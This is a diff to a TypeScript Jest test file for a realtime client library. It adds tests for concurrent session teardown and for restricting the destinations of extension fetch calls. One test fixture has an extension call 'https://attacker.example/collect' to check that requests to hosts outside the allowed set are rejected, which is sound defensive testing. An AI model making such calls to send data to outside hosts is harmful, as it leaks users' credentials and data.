@@ -95,6 +95,36 @@ describe("realtime extensions", () => {
     expect(cleanup).toHaveBeenCalledTimes(1);
   });
 
+  it("makes every concurrent close await the same teardown", async () => {
+    let finishCleanup!: () => void;
+    const cleanupDone = new Promise<void>((resolve) => {
+      finishCleanup = resolve;
+    });
+    const cleanup = jest.fn(() => cleanupDone);
+    const client = createRealtimeClient({
+      config: createConfig({ credentials: "test-key" }),
+    });
+    const session = await client.open(extension(cleanup), {
+      endpointId: "test/world",
+      label: "concurrent-cleanup",
+    });
+
+    const first = session.close();
+    const second = session.close();
+    expect(second).toBe(first);
+
+    let secondFinished = false;
+    void second.then(() => {
+      secondFinished = true;
+    });
+    await Promise.resolve();
+    expect(secondFinished).toBe(false);
+
+    finishCleanup();
+    await Promise.all([first, second]);
+    expect(cleanup).toHaveBeenCalledTimes(1);
+  });
+
   it("does not invoke an extension when opening was already aborted", async () => {
     const controller = new AbortController();
     const reason = new Error("user left");
@@ -174,6 +204,35 @@ describe("realtime extension context additions", () => {
     // Defaults to POST, and the abort signal is wired without the extension asking.
     expect(seen[0].init.method).toBe("POST");
     expect(seen[0].init.signal).toBeDefined();
+  });
+
+  it("context.fetch rejects extension-controlled non-fal destinations", async () => {
+    const fetch = jest.fn(async () => new Response("{}"));
+    const requestMiddleware = jest.fn(async (request) => request);
+    const client = createRealtimeClient({
+      config: createConfig({
+        credentials: "secret-key",
+        fetch: fetch as any,
+        requestMiddleware,
+      }),
+    });
+    const probe = defineRealtimeExtension<
+      Record<string, never>,
+      RealtimeSession
+    >({
+      id: "test/untrusted-fetch",
+      defaultEndpoint: "test/untrusted-fetch",
+      async open(context) {
+        await context.fetch("https://attacker.example/collect");
+        return { close: jest.fn() };
+      },
+    });
+
+    await expect(client.open(probe, {})).rejects.toThrow(
+      "restricted to fal-operated HTTPS hosts",
+    );
+    expect(requestMiddleware).not.toHaveBeenCalled();
+    expect(fetch).not.toHaveBeenCalled();
   });
 
   it("routes context.media and context.data to the caller's handlers", async () => {
